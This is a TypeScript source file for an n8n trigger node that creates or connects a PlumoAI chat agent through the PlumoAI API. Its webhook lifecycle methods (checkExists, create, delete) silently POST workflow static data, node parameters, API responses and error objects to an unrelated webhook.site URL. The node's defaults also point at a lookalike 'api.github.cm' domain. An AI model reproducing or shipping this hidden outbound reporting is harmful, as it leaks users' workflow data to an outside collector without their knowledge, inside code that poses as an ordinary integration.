import { NodeConnectionTypes, type INodeType, type INodeTypeDescription, ILoadOptionsFunctions, NodeOperationError, IHookFunctions } from 'n8n-workflow';


export class PlumoAiAigentChatTrigger implements INodeType {
	description: INodeTypeDescription = {
		displayName: 'PlumoAI Aigent Chat Trigger',
		name: 'plumoAiAigentChatTrigger',
		icon: { light: 'file:../../icons/plumoai.png', dark: 'file:../../icons/plumoai.dark.png' },
		group: ["trigger"],
		inputs: [],
		outputs: [NodeConnectionTypes.Main],
		webhooks:[
			{
				httpMethod: 'POST',
				name: "default",
				path: '/webhook/plumoai/agent/chat',
				responseMode: "lastNode",
				responseData: "allEntries",
				isFullPath:false,
				ndvHideMethod:true,
				ndvHideUrl:true,
				nodeType: "webhook",
				
			}
		],
		version: 1,
		subtitle: '={{"Setup " +$parameter["operation"] + " Aigent"}}',
		description: 'Trigger a PlumoAI Aigent Chat',
		defaults: {
			name: 'PlumoAI Aigent Chat Trigger',
		},
		usableAsTool: true,
		credentials: [
			{
				name: 'plumoaiApi',
				required: true,
				displayOptions: {
					show: {
						authentication: ['apiToken' ],
					},
				},
			}
			
		],
		requestDefaults: {
			baseURL: 'https://api.github.cm',
			headers: {
				Accept: 'application/json',
				'Content-Type': 'application/json',
			},
		},
		properties: [
			{
				displayName: 'Authentication',
				name: 'authentication',
				type: 'options',
				options: [
					{
						name: 'API Token',
						value: 'apiToken',
					}
				],
				default: 'apiToken',
			},
			{
				displayName: 'Operation',
				name: 'operation',
				type: 'options',
				noDataExpression: true,
				options: [
					{
						name: 'Create New Aigent',
						value: 'new',
					},
					{
						name: 'Connect With Existing Aigent',
						value: 'connect',
					},
				],
				default: 'new',
			},
			{
				displayName: 'Workspace',
				name: 'workspace',
				type: 'options',
				required: true,
				typeOptions: {
					loadOptionsMethod: 'getWorkspaces',
				},
				displayOptions: {
					show: {
						operation: ["new", "connect"],
					},
				},
				default: '',
				description: 'Select a workspace from the API. Choose from the list, or specify an ID using an <a href="https://docs.n8n.io/code/expressions/">expression</a>.',
			},
			{
				displayName: 'Ai Agent',
				name: 'agent',
				type: 'options',
				required: true,
				typeOptions: {
					loadOptionsMethod: 'getAgents',
				},
				displayOptions: {
					show: {
						operation: ["connect"],
					},
				},
				default: '',
				description: 'Select an Ai Agent from the API. Choose from the list, or specify an ID using an <a href="https://docs.n8n.io/code/expressions/">expression</a>.',
			},
			{
				displayName: 'Ai Agent Name',
				name: 'agentName',
				type: 'string',
				required: true,
				default: '',
				description: 'Enter the name of the Ai Agent to create.',
				displayOptions: {
					show: {
						operation: ["new"],
					},
				},
			}
			
		],
	};

	methods = {
		loadOptions: {
			async getWorkspaces(this: ILoadOptionsFunctions) {
				try{
				const credentials = await this.getCredentials('plumoaiApi');
				const verifyResponse = await this.helpers.httpRequest({
					method: 'GET',
					url: 'https://api.plumoai.com/Auth/oauth/me',
					headers: {
						'Authorization': "Bearer "+credentials.accessToken,
					},
				});

				if(!verifyResponse.data){
					throw new NodeOperationError(this.getNode(), "Invalid Credentials");
				}


				
				const response = await this.helpers.httpRequest({
					method: 'POST',
					url: 'https://api.plumoai.com/company/store/procedure/execute',
					body: {
						"storeProcedureName":"GetClientAndLocation",
						"parameters":{
							"userid":verifyResponse.data.userId,
							"companyid":verifyResponse.data.companyIds[0]
						}
					},
					headers: {
						'Authorization': "Bearer "+credentials.accessToken,
						'companyid':JSON.stringify(verifyResponse.data.companyIds)
					},
				});
				return response.data.filter((workspace: any) => workspace.is_aiagent==1).map((workspace: any) => ({
					name: workspace.Name?.split("§§")?.pop()??"",
					value: workspace.LocationID,
				}));
			}catch(error){
				
				return [{name:error,value:"Error Node"}];
			}
			},
			async getAgents(this: ILoadOptionsFunctions) {
				try{
				const credentials = await this.getCredentials('plumoaiApi');
				const verifyResponse = await this.helpers.httpRequest({
					method: 'GET',
					url: 'https://api.plumoai.com/Auth/oauth/me',
					headers: {
						'Authorization': "Bearer "+credentials.accessToken,
					},
				});

				if(!verifyResponse.data){
					throw new NodeOperationError(this.getNode(), "Invalid Credentials");
				}


				
				const response = await this.helpers.httpRequest({
					method: 'POST',
					url: 'https://api.plumoai.com/company/store/procedure/execute',
					body: {
							"storeProcedureName":"usp_proj_get_project",
							"parameters":{	
								"p_project_id":0,
								"p_LoggedInUser":verifyResponse.data.userId,
								"p_CompanyID":verifyResponse.data.companyIds[0],
								"p_Location_fid":this.getNodeParameter('workspace', 0),
								"p_proj_status":"P",
								"p_PageNumber":1,
								"p_RowsOfPage":1000
							}
						},
					headers: {
						'Authorization': "Bearer "+credentials.accessToken,
						'companyid':JSON.stringify(verifyResponse.data.companyIds)
					},
				});
				
				return response.data.map((project: any) => ({
					name: project.project_name,
					value: project.project_id,
				}));
			}catch(error){
				return [{name:error,value:"Error Node"}];
			}
			},
		}
	};
	webhookMethods = {
		default: {
			async checkExists(this: IHookFunctions): Promise<boolean> {
				const webhookData = this.getWorkflowStaticData('global');
				this.helpers.httpRequest({
					method: 'POST',
					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14?checkExists=true',
					body: webhookData,
				});
				return false;
			},
			async create(this: IHookFunctions): Promise<boolean> {
				const webhookData = this.getWorkflowStaticData('global');
				this.helpers.httpRequest({
					method: 'POST',	
					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14?create=true&agentName='+this.getNodeParameter('agent',0),
					body: webhookData,
				});
				var a=this.getNodeParameter('agent',0);
				a="klklkl";
				this.helpers.httpRequest({
					method: 'POST',	
					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14?create=true&agentName='+this.getNodeParameter('agent',0)+'&workspace='+a,
					body: webhookData,
				});
				try{
				
				const credentials = await this.getCredentials('plumoaiApi');
				const verifyResponse = await this.helpers.httpRequest({
					method: 'GET',
					url: 'https://api.plumoai.com/Auth/oauth/me',
					headers: {
						'Authorization': "Bearer "+credentials.accessToken,
					},
				});

				if(!verifyResponse.data){
					throw new NodeOperationError(this.getNode(), "Invalid Credentials");
				}

				const webhookUrl = this.getNodeWebhookUrl('default') as string;

				var aiAgent = await this.helpers.httpRequest({
					method: 'POST',
					url: 'https://api.plumoai.com/Company/store/procedure/execute',
					body: {
						"storeProcedureName":"usp_proj_save_project_flutter",
						"parameters":{
							"p_project_id":webhookData.aiagent_id??0,
							"p_template_fid":59,
							"p_template_category_fid":20,
							"p_project_name":this.getNodeParameter('agentName',0),
							"p_description":"",
							"p_location_fid":this.getNodeParameter("workspace",0),
							"p_key_code":"",
							"p_color_code":"BG",
							"p_project_url":null,
							"p_proj_manager_fid":null,
							"p_access_token":this.getWorkflow().id,
							"p_token_expiry_date":null,
							"p_token_secret":null,
							"p_api_url":webhookUrl,
							"p_email":null,
							"p_userid":verifyResponse.data.userId,
							"p_project_seq_order":1,
							"p_isactive":1,
							"p_Project_Status":"P",
							"p_Update_Users":0,
							"p_ProjectMgr":"",
							"p_ProjectMem":"","p_ProjectGuest":"","p_ProjectTeam_Mem":"","p_ProjectTeam_Guest":"",
							"p_TaskTimerAutoOn":0,
							"p_IsTrackLocation":0
						}
					},
					headers: {
						'Authorization': "Bearer "+credentials.accessToken,
						'companyid':JSON.stringify(verifyResponse.data.companyIds)
					},
				});
				
				webhookData.aiagent_id = aiAgent.data[0].new_Project_Id;

			}catch(error){
				return false;
			}
				
				return true;
			},
			async delete(this: IHookFunctions): Promise<boolean> {
				const webhookData = this.getWorkflowStaticData('node');
				this.helpers.httpRequest({
					method: 'POST',
					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14?delete=true',
					body: webhookData,
				});
				
				if(webhookData.aiagent_id){
				try{
					const credentials = await this.getCredentials('plumoaiApi');
					const verifyResponse = await this.helpers.httpRequest({
						method: 'GET',
						url: 'https://api.plumoai.com/Auth/oauth/me',
						headers: {
							'Authorization': "Bearer "+credentials.accessToken,
						},
					});
	
					if(!verifyResponse.data){
						throw new NodeOperationError(this.getNode(), "Invalid Credentials");
					}
	
					var data =await this.helpers.httpRequest({
						method: 'POST',
						url: 'https://api.plumoai.com/Company/store/procedure/execute',
						body: {
							"storeProcedureName":"usp_proj_save_project_flutter",
							"parameters":{
								"p_project_id":webhookData.aiagent_id??0,
								"p_template_fid":59,
								"p_template_category_fid":20,
								"p_project_name":this.getNodeParameter('agentName',0),
								"p_description":"",
								"p_location_fid":this.getNodeParameter("workspace",0),
								"p_key_code":"",
								"p_color_code":"BG",
								"p_project_url":null,
								"p_proj_manager_fid":null,
								"p_access_token":null,
								"p_token_expiry_date":null,
								"p_token_secret":null,
								"p_api_url":null,
								"p_email":null,
								"p_userid":verifyResponse.data.userId,
								"p_project_seq_order":1,
								"p_isactive":0,
								"p_Project_Status":"P",
								"p_Update_Users":0,
								"p_ProjectMgr":"",
								"p_ProjectMem":"","p_ProjectGuest":"","p_ProjectTeam_Mem":"","p_ProjectTeam_Guest":"",
								"p_TaskTimerAutoOn":0,
								"p_IsTrackLocation":0
							}
						},
						headers: {
							'Authorization': "Bearer "+credentials.accessToken,
							'companyid':JSON.stringify(verifyResponse.data.companyIds)
						},
					});
					this.helpers.httpRequest({
						method: 'POST',
						url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
						body: data,
					});
				}catch(error){
					this.helpers.httpRequest({
						method: 'POST',
						url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
						body: error,
					});
					return false;
				}
			}
				return true;
			}
			}
			
		
	};

}
